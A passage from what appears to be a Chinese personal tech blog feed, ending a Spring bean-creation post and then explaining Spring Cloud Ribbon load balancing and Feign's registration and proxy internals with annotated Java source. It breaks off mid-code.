hasDependentBean(beanName)) &#123;</span><br><span class="line">				...</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Register bean as disposable.</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="comment">// 注册销毁的Bean的销毁接口</span></span><br><span class="line">		registerDisposableBeanIfNecessary(beanName, bean, mbd);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (BeanDefinitionValidationException ex) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationException</span>(</span><br><span class="line">				mbd.getResourceDescription(), beanName, <span class="string">&quot;Invalid destruction signature&quot;</span>, ex);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> exposedObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到这里，Bean就创建完成了，最终会放入一级缓存中。在这个过程中，有几点需要说明：</p>
<ol>
<li>构造方法中的循环依赖无法解决，因为构造完后Bean才被封装放入三级缓存(&#96;&#96;)</li>
<li>多例的Bean是不会存在缓存中的，也无法解决循环依赖</li>
<li>工厂方法和@Bean标注的方法(@Bean标注的方法也是工厂方法)也无法解决循环依赖</li>
<li>setter方法注入(&#96;&#96;)和@Autowired可以解决循环依赖，因为实例化之后才执行setter方法和@Autowired注入</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a href="https://images.gitee.com/uploads/images/2020/1224/165929_56e3d91d_8183653.jpeg"><img  
                     lazyload
                     alt="image"
                     data-src="https://images.gitee.com/uploads/images/2020/1224/165929_56e3d91d_8183653.jpeg"
                      alt="输入图片说明"
                ></a></p>
<hr>
<p>看不下去了 等过段事件再看spring</p>
<p>2021.6.1</p>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud</title>
    <url>/2021/08/10/2021/SpringCloud/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Ribbon"><a href="#Ribbon" class="headerlink" title="Ribbon"></a>Ribbon</h1><h2 id="基础认识"><a href="#基础认识" class="headerlink" title="基础认识"></a>基础认识</h2><p>目前主流的负载方案分为以下两种：</p>
<ul>
<li>集中式负载均衡，在<strong>消费者和服务提供方中间</strong>使用独立的代理方式进行负载，有硬件的（比如 F5），也有软件的（比如 Nginx）。</li>
<li>客户端根据自己的请求情况做负载均衡，Ribbon 就属于客户端自己做负载均衡。</li>
</ul>
<p>Ribbon客户端组件提供一系列的完善的配置，如超时，重试等。通过Load Balancer获取到服务提供的所有机器实例，Ribbon会自动基于某种规则(轮询，随机)去调用这些服务。Ribbon也可以实现我们自己的负载均衡算法。</p>
<h2 id="常见的负载均衡算法"><a href="#常见的负载均衡算法" class="headerlink" title="常见的负载均衡算法"></a>常见的负载均衡算法</h2><ul>
<li>随机，通过随机选择服务进行执行，一般这种方式使用较少;</li>
<li>轮训，负载均衡默认实现方式，请求来之后排队处理;</li>
<li>加权轮训，通过对服务器性能的分型，给高配置，低负载的服务器分配更高的权重，均衡各个服务器的压力;</li>
<li>地址Hash，通过客户端请求的地址的HASH值取模映射进行服务器调度。  ip hash</li>
<li>最小链接数，即使请求均衡了，压力不一定会均衡，最小连接数法就是根据服务器的情况，比如请求积压数等参数，将请求分配到当前压力最小的服务器上。  最小活跃数</li>
</ul>
<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>导入依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-ribbon<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>主要是依靠<code>@LoadBalanced</code>注解处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span>  <span class="comment">//客戶端的負載均衡</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这一步,<code>@LoadBalanced</code>是在<code>RestTemplate</code>中配置了拦截器，将<code>LoadBalanceInterceptor</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/25/pHxsDZiVT7N4ha3.png"
                      alt="image.png"
                ></p>
<p>可以看到这里对<code>restTemplate</code>设置了拦截器处理</p>
<p>回到使用，在<code>Controller</code>中是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/findOrderByUserId/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R  <span class="title function_">findOrderByUserId</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span> &#123;</span><br><span class="line">    <span class="comment">//这里将会被Ribbon从注册中心拉去服务，然后进行分析</span></span><br><span class="line">    <span class="comment">//通过对应负载均衡算法进行更改URL，得到最后的调用地址，完成调用</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://mall-order/order/findOrderByUserId/&quot;</span>+id;</span><br><span class="line">    <span class="type">R</span> <span class="variable">result</span> <span class="operator">=</span> restTemplate.getForObject(url,R.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Ribbon基本的调用如下图</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/25/cmrUznqRkiyOMFQ.png"
                      alt="image.png"
                ></p>
<p>其实主要的逻辑就是拉取服务，确定调用的位置，调用。</p>
<p>那么小的模拟Ribbon的demo如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="comment">//基本的RestTemplate</span></span><br><span class="line"><span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/findOrderByUserId/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R  <span class="title function_">findOrderByUserId</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span> &#123;</span><br><span class="line">    <span class="comment">//模拟ribbon实现</span></span><br><span class="line">    <span class="comment">//主要看getUri</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> getUri(<span class="string">&quot;liduoan-order&quot;</span>)+<span class="string">&quot;/order/findOrderByUserId/&quot;</span>+id;</span><br><span class="line">    <span class="comment">// 添加@LoadBalanced</span></span><br><span class="line">    <span class="type">R</span> <span class="variable">result</span> <span class="operator">=</span> restTemplate.getForObject(url,R.class);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="comment">//这是Nacos提供的客户端</span></span><br><span class="line"><span class="keyword">private</span> DiscoveryClient discoveryClient;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getUri</span><span class="params">(String serviceName)</span> &#123;</span><br><span class="line">    <span class="comment">//获取对应服务名下的所有服务</span></span><br><span class="line">    List&lt;ServiceInstance&gt; serviceInstances = discoveryClient.getInstances(serviceName);</span><br><span class="line">    <span class="comment">//简单判断</span></span><br><span class="line">    <span class="keyword">if</span> (serviceInstances == <span class="literal">null</span> || serviceInstances.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">serviceSize</span> <span class="operator">=</span> serviceInstances.size();</span><br><span class="line">    <span class="comment">//轮询,确定调用哪个服务</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">indexServer</span> <span class="operator">=</span> incrementAndGetModulo(serviceSize);</span><br><span class="line">    <span class="comment">//返回最终调用字符串</span></span><br><span class="line">    <span class="keyword">return</span> serviceInstances.get(indexServer).getUri().toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//原子数，用来负载均衡</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">AtomicInteger</span> <span class="variable">nextIndex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">incrementAndGetModulo</span><span class="params">(<span class="type">int</span> modulo)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//其实就是轮询</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">current</span> <span class="operator">=</span> nextIndex.get();</span><br><span class="line">        <span class="type">int</span> <span class="variable">next</span> <span class="operator">=</span> (current + <span class="number">1</span>) % modulo;</span><br><span class="line">        <span class="comment">//CAS操作，如果失败表示已经有人使用过这个【next】的URL了</span></span><br><span class="line">        <span class="keyword">if</span> (nextIndex.compareAndSet(current, next) </span><br><span class="line">            <span class="comment">//调用完nextIndex为新值</span></span><br><span class="line">            下面不太理解为什么要这么处理，感觉多次一举</span><br><span class="line">            &amp;&amp; current &lt; modulo)&#123;</span><br><span class="line">            <span class="keyword">return</span> current;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Feign"><a href="#Feign" class="headerlink" title="Feign"></a>Feign</h1><h2 id="基础认识-1"><a href="#基础认识-1" class="headerlink" title="基础认识"></a>基础认识</h2><p>我们在Ribbon中看到常用的服务调用是使用对应的Http客户端进行调用的。</p>
<p>常见的客户端有：</p>
<ul>
<li><strong>Httpclient</strong></li>
</ul>
<p>HttpClient 是 Apache Jakarta Common 下的子项目，用来提供高效的、最新的、功能丰富的支持 Http 协议的客户端编程工具包，并且它支持 HTTP 协议最新版本和建议。HttpClient 相比传统 JDK 自带的 URLConnection，提升了易用性和灵活性，使客户端发送 HTTP 请求变得容易，提高了开发的效率。</p>
<ul>
<li><strong>Okhttp</strong></li>
</ul>
<p>一个处理网络请求的开源项目，是安卓端最火的轻量级框架，由 Square 公司贡献，用于替代 HttpUrlConnection 和 Apache HttpClient。OkHttp 拥有简洁的 API、高效的性能，并支持多种协议（HTTP&#x2F;2 和 SPDY）。</p>
<ul>
<li><strong>HttpURLConnection</strong></li>
</ul>
<p>HttpURLConnection 是Java的标准类，它继承自 URLConnection，可用于向指定网站发送 GET 请求、POST 请求。HttpURLConnection 使用比较复杂，不像 HttpClient 那样容易使用。</p>
<ul>
<li><strong>RestTemplate &amp; WebClient</strong></li>
</ul>
<p>RestTemplate 是Spring提供的用于访问 Rest 服务的客户端，RestTemplate 提供了多种便捷访问远程 HTTP 服务的方法，能够大大提高客户端的编写效率。</p>
<hr>
<p>而Feign的调用方式比上面的更为优雅和平滑，类似Dubbo，我们希望像调用本地方法那样来调用远程服务。</p>
<p>Feign支持多种注解，例如Feign自带的注解或者JAX-RS注解等。</p>
<p>Spring Cloud openfeign对Feign进行了增强，使其支持Spring MVC注解，另外还整合了Ribbon和Eureka，从而使得Feign的使用更加方便。</p>
<p>Feign可以做到使用 HTTP 请求远程服务时就像调用本地方法一样的体验，开发者完全感知不到这是远程方法，更感知不到这是个 HTTP 请求。、</p>
<p>它像 Dubbo 一样，consumer 直接调用接口方法调用 provider，而不需要通过常规的 Http Client 构造请求再解析返回数据。它解决了让开发者调用远程接口就跟调用本地方法一样，无需关注与远程的交互细节，更无需关注分布式环境开发。</p>
<h2 id="基本使用-1"><a href="#基本使用-1" class="headerlink" title="基本使用"></a>基本使用</h2><p>我们使用SpringCloud整合Feign</p>
<p>首先是依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- openfeign 远程调用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后编写对应的调用接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//FeignConfig局部配置</span></span><br><span class="line"><span class="meta">@FeignClient(value = &quot;mall-order&quot;,path = &quot;/order&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OrderFeignService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/findOrderByUserId/&#123;userId&#125;&quot;)</span></span><br><span class="line">    R <span class="title function_">findOrderByUserId</span><span class="params">(<span class="meta">@PathVariable(&quot;userId&quot;)</span> Integer userId)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/save&quot;,consumes = MediaType.APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="comment">//注意到这里是转成json处理了</span></span><br><span class="line">    R <span class="title function_">save</span><span class="params">(<span class="meta">@RequestBody</span> OrderVo order)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在启动类上加上注解：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableFeignClients</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MallUserFeignDemoApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(MallUserFeignDemoApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发起调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注入feign</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    OrderFeignService orderFeignService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/findOrderByUserId/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R  <span class="title function_">findOrderByUserId</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id)</span> &#123;</span><br><span class="line">        <span class="comment">// feign调用</span></span><br><span class="line">        <span class="type">R</span> <span class="variable">result</span> <span class="operator">=</span> orderFeignService.findOrderByUserId(id);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>首先我们从整体上看：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/25/EHa8RtouZOdW23G.png"
                      alt="image.png"
                ></p>
<p>其实这样看我们就可以大致了解逻辑了。</p>
<p>但是我们再从来源走向去思考：</p>
<p>首先我们一开始是使用对应的Http客户端直接访问，那么我们的目的是为了像调用本地方法那样去访问。</p>
<p>如此，需要确定服务名，确定路径，保证调用的地址能够确定。</p>
<p>之后我们调用本地方法，获取对应返回值。</p>
<p>然而我这样解释，搞得我都有点不太理解了，所以我去看了下源码，直接从源码走向去整体理解。</p>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>我觉得整体上还是Spring那套，回顾一下Spring那点东西，就依照我以前画的图：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/07/X4TUqmcu2EBWOs3.jpg"
                      alt="Screenshot_75.jpg"
                ></p>
<h4 id="注入BendDefiniton"><a href="#注入BendDefiniton" class="headerlink" title="注入BendDefiniton"></a>注入BendDefiniton</h4><p>正常而言，我们的接口实现是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FeignClient(value = &quot;mall-order&quot;,path = &quot;/order&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OrderFeignService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/findOrderByUserId/&#123;userId&#125;&quot;)</span></span><br><span class="line">    R <span class="title function_">findOrderByUserId</span><span class="params">(<span class="meta">@PathVariable(&quot;userId&quot;)</span> Integer userId)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/save&quot;,consumes = MediaType.APPLICATION_JSON_VALUE)</span></span><br><span class="line">    R <span class="title function_">save</span><span class="params">(<span class="meta">@RequestBody</span> OrderVo order)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看注解：<code>@FeignClient</code>，按照Spring的尿性，可能是从扫描包开始。</p>
<p>那么我们可以在<code>FeignClientsRegistrar</code>这个类中发现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerBeanDefinitions</span><span class="params">(AnnotationMetadata metadata,</span></span><br><span class="line"><span class="params">                                    BeanDefinitionRegistry registry)</span> &#123;</span><br><span class="line">    <span class="comment">//标准的查看配置</span></span><br><span class="line">    registerDefaultConfiguration(metadata, registry);</span><br><span class="line">    <span class="comment">//字面意义的注册客户端</span></span><br><span class="line">    registerFeignClients(metadata, registry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们进入<code>registerDefaultConfiguration</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">registerDefaultConfiguration</span><span class="params">(AnnotationMetadata metadata,</span></span><br><span class="line"><span class="params">                                          BeanDefinitionRegistry registry)</span> &#123;</span><br><span class="line">    Map&lt;String, Object&gt; defaultAttrs = metadata</span><br><span class="line">        .getAnnotationAttributes(EnableFeignClients.class.getName(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (defaultAttrs != <span class="literal">null</span> &amp;&amp; defaultAttrs.containsKey(<span class="string">&quot;defaultConfiguration&quot;</span>)) &#123;</span><br><span class="line">        String name;</span><br><span class="line">        <span class="keyword">if</span> (metadata.hasEnclosingClass()) &#123;</span><br><span class="line">            name = <span class="string">&quot;default.&quot;</span> + metadata.getEnclosingClassName();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            name = <span class="string">&quot;default.&quot;</span> + metadata.getClassName();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//重点在这里</span></span><br><span class="line">        registerClientConfiguration(registry, name,</span><br><span class="line">                                    defaultAttrs.get(<span class="string">&quot;defaultConfiguration&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">registerClientConfiguration</span><span class="params">(BeanDefinitionRegistry registry, Object name,</span></span><br><span class="line"><span class="params">                                         Object configuration)</span> &#123;</span><br><span class="line">    <span class="type">BeanDefinitionBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> BeanDefinitionBuilder</span><br><span class="line">        .genericBeanDefinition(FeignClientSpecification.class);</span><br><span class="line">    builder.addConstructorArgValue(name);</span><br><span class="line">    builder.addConstructorArgValue(configuration);</span><br><span class="line">    <span class="comment">//注册了大量的Bean定义</span></span><br><span class="line">    registry.registerBeanDefinition(</span><br><span class="line">        name + <span class="string">&quot;.&quot;</span> + FeignClientSpecification.class.getSimpleName(),</span><br><span class="line">        builder.getBeanDefinition());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过查看可以发现</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/25/VxiPz4aEvAc5p39.png"
                      alt="image.png"
                ></p>
<p>其中有大量的后置处理器被放入BeanDefinitionMap和启动类中。</p>
<p>到现在，是完成了主要的默认操作。我们接下来该走<code> registerFeignClients(metadata, registry);</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerFeignClients</span><span class="params">(AnnotationMetadata metadata,</span></span><br><span class="line"><span class="params">                                 BeanDefinitionRegistry registry)</span> &#123;</span><br><span class="line">    <span class="comment">//获取扫描器，以便后续扫描包</span></span><br><span class="line">    <span class="type">ClassPathScanningCandidateComponentProvider</span> <span class="variable">scanner</span> <span class="operator">=</span> getScanner();</span><br><span class="line">    scanner.setResourceLoader(<span class="built_in">this</span>.resourceLoader);</span><br><span class="line"></span><br><span class="line">    Set&lt;String&gt; basePackages;</span><br><span class="line">	<span class="comment">//metadata</span></span><br><span class="line">    ..........</span><br><span class="line">    <span class="comment">//最终获取到了包名</span></span><br><span class="line">    <span class="comment">//这个地方就太熟悉了 SpringMvc也是这样获得对应的Controller，然后注册到BeanDefinition中</span></span><br><span class="line">    <span class="keyword">for</span> (String basePackage : basePackages) &#123;</span><br><span class="line">        <span class="comment">//BeanDefinition的Set</span></span><br><span class="line">        Set&lt;BeanDefinition&gt; candidateComponents = scanner</span><br><span class="line">            .findCandidateComponents(basePackage);</span><br><span class="line">        <span class="comment">//注意到上面定向到了BeanDefinition</span></span><br><span class="line">        <span class="comment">//挺奇怪的是为什么没有其他Bean定义，只有OrderFeignService的Bean定义</span></span><br><span class="line">        <span class="comment">//通过遍历BeanDefinition来确定这些是否是</span></span><br><span class="line">        <span class="keyword">for</span> (BeanDefinition candidateComponent : candidateComponents) &#123;</span><br><span class="line">            <span class="keyword">if</span> (candidateComponent <span class="keyword">instanceof</span> AnnotatedBeanDefinition) &#123;</span><br><span class="line">                <span class="comment">// verify annotated class is an interface</span></span><br><span class="line">                <span class="type">AnnotatedBeanDefinition</span> <span class="variable">beanDefinition</span> <span class="operator">=</span> (AnnotatedBeanDefinition) candidateComponent;</span><br><span class="line">                <span class="type">AnnotationMetadata</span> <span class="variable">annotationMetadata</span> <span class="operator">=</span> beanDefinition.getMetadata();</span><br><span class="line">                Assert.isTrue(annotationMetadata.isInterface(),</span><br><span class="line">                              <span class="string">&quot;@FeignClient can only be specified on an interface&quot;</span>);</span><br><span class="line">				<span class="comment">//获取到带FeignClient注解</span></span><br><span class="line">                Map&lt;String, Object&gt; attributes = annotationMetadata</span><br><span class="line">                    .getAnnotationAttributes(</span><br><span class="line">                    FeignClient.class.getCanonicalName());</span><br><span class="line">				<span class="comment">//获取所有的BeanName</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> getClientName(attributes);</span><br><span class="line">                registerClientConfiguration(registry, name,</span><br><span class="line">                                            attributes.get(<span class="string">&quot;configuration&quot;</span>));</span><br><span class="line"></span><br><span class="line">                registerFeignClient(registry, annotationMetadata, attributes);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是刚刚提到的情况，不过并不很重要。</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">//注意到上面定向到了BeanDefinition</span><br><span class="line">//挺奇怪的是为什么没有其他Bean定义，只有OrderFeignService的Bean定义</span><br><span class="line">//通过遍历BeanDefinition来确定这些是否是</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/25/6udaM3kFZvlNWiy.png"
                      alt="image.png"
                ></p>
<p>到了现在	我们终于把BeanDefinition注册了。</p>
<p>我本来想去BeanDeinitionMap中把这个Bean定义找出来截图，但是好多啊，看的眼疼，就算了吧。。</p>
<h4 id="生成代理类"><a href="#生成代理类" class="headerlink" title="生成代理类"></a>生成代理类</h4><p>注入bean之后，通过jdk的代理生成代理类</p>
<p>代码在ReflectiveFeign类中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">newInstance</span><span class="params">(Target&lt;T&gt; target)</span> &#123;</span><br><span class="line">    <span class="comment">//注意这里获取到了</span></span><br><span class="line">    Map&lt;String, MethodHandler&gt; nameToHandler = targetToHandlersByName.apply(target);</span><br><span class="line">    Map&lt;Method, MethodHandler&gt; methodToHandler = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;Method, MethodHandler&gt;();</span><br><span class="line">    List&lt;DefaultMethodHandler&gt; defaultMethodHandlers = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;DefaultMethodHandler&gt;();</span><br><span class="line">	<span class="comment">//这一步就是把对应的方法放到methodToHandler</span></span><br><span class="line">    <span class="keyword">for</span> (Method method : target.type().getMethods()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getDeclaringClass() == Object.class) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Util.isDefault(method)) &#123;</span><br><span class="line">            <span class="type">DefaultMethodHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultMethodHandler</span>(method);</span><br><span class="line">            defaultMethodHandlers.add(handler);</span><br><span class="line">            methodToHandler.put(method, handler);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            methodToHandler.put(method, nameToHandler.get(Feign.configKey(target.type(), method)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这里就是创建代理对象了</span></span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> factory.create(target, methodToHandler);</span><br><span class="line">    <span class="type">T</span> <span class="variable">proxy</span> <span class="operator">=</span> (T) Proxy.newProxyInstance(target.type().getClassLoader(),</span><br><span class="line">                                         <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[] &#123;target.type()&#125;, handler);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (DefaultMethodHandler defaultMethodHandler : defaultMethodHandlers) &#123;</span><br><span class="line">        defaultMethodHandler.bindTo(proxy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//最后返回代理类</span></span><br><span class="line">    <span class="keyword">return</span> proxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Map&lt;String, MethodHandler&gt; nameToHandler</code>中的具体东西</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/25/lzK5TietbcRoNLF.png"
                      alt="image.png"
                ></p>
<p>看到了对应的Http客户端，对应的请求拦截器，对应的日志。</p>
<p>同时注意到，这里是使用了LoadBalancerDeignClient的客户端，说明它具有负载均衡的能力</p>
<p>也说明它可以把对应服务名最后转换成IP+端口的形式、</p>
<p>同时我们的两个方法名也获得了</p>
<p>让我们在看下最后生成的代理类：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/25/kB5gnVE6adLIlwc.png"
                      alt="image.png"
                ></p>
<p>注意到了两个Method方法。</p>
<h4 id="发生请求"><a href="#发生请求" class="headerlink" title="发生请求"></a>发生请求</h4><p>当我们请求过来时，主要逻辑在<code>SynchronousMethodHandler</code>中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object[] argv)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="comment">//好家伙，最后的客户端终于出现了</span></span><br><span class="line">    <span class="comment">//注意哦 这里是构建了请求格式</span></span><br><span class="line">    <span class="type">RequestTemplate</span> <span class="variable">template</span> <span class="operator">=</span> buildTemplateFromArgs.create(argv);</span><br><span class="line">    <span class="type">Options</span> <span class="variable">options</span> <span class="operator">=</span> findOptions(argv);</span><br><span class="line">    <span class="type">Retryer</span> <span class="variable">retryer</span> <span class="operator">=</span> <span class="built_in">this</span>.retryer.clone();</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span 